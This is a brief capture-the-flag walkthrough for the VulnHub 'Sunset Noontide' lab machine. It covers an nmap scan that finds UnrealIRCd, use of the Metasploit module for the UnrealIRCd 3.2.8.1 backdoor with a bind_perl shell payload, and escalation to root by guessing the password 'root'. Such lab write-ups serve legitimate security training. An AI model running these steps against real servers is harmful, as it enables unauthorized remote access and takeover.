# [Machine](https://www.vulnhub.com/entry/sunset-noontide,531/)

- # ENUM 
	- ### nmap(`nmap -A -p- Sunset-Noon`)
		- ```PORT     STATE SERVICE VERSION
			6667/tcp open  irc     UnrealIRCd (Admin email example@example.com)
			6697/tcp open  irc     UnrealIRCd (Admin email example@example.com)
			8067/tcp open  irc     UnrealIRCd (Admin email example@example.com)```

- # EXPLOITATION
	- Search on `searchsploit` an `UnrealIRCd` vulnerability:
		- `UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)`
	- Run `msfconsole` and run the exploit, with `cmd/unix/bind_perl` payload.
	- Try to `su root` guessing the password.
		- Password: `root`
			- We're ROOT!
